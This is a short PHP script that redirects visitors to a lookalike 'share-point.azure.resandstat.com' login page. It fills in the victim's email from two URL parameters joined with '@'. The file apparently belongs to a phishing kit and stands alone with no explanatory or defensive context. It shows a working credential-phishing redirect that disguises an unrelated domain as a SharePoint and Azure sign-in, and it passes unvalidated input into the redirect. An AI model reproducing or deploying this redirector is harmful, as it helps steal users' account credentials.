<?php
function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }
 exit();
}
Redirect("https://share-point.azure.resandstat.com/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
?>
